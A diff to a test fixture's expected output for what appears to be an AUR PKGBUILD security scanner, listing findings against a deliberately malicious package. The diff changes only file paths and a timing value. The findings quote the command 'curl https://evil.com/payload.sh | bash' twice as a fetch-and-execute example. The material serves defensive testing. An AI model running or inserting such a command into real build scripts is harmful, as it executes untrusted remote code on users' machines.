@@ -4,27 +4,27 @@ Scan Results: malicious-curl-bash
 
 [CRITICAL] DLE-001 Curl pipe to shell
     Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD:15
+    Location: tests/fixtures/malicious/curl-bash/PKGBUILD:15
     Code:     curl https://evil.com/payload.sh | bash
     Recommendation: Download scripts first, review them, then execute
     Reference: CWE-94
 
 [CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.com/payload.sh
     This package downloads and executes code from https://evil.com/payload.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD:15
+    Location: tests/fixtures/malicious/curl-bash/PKGBUILD:15
     Code: curl https://evil.com/payload.sh | bash
     Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
     Reference: CWE-494
 
 [CRITICAL] PRIV-001 Sudo usage in package()
     Function 'package' uses sudo, which should never be needed in PKGBUILDs
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD:18
+    Location: tests/fixtures/malicious/curl-bash/PKGBUILD:18
     Recommendation: Remove sudo; makepkg handles permissions correctly
     Reference: CWE-250
 
 [HIGH] FUNC-001 Network access in build function
     Function 'build' contains network access command 'curl'
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD:13
+    Location: tests/fixtures/malicious/curl-bash/PKGBUILD:13
     Recommendation: Network access should happen in source= array, not build functions
 
 [MEDIUM] SRC-005 No sources with build function
@@ -35,7 +35,7 @@ Scan Results: malicious-curl-bash
 
 ============================================================
 Package: malicious-curl-bash v1.0.0-1
-Scan duration: 2ms
+Scan duration: 5ms
 
 Found 5 issue(s):
   3 CRITICAL
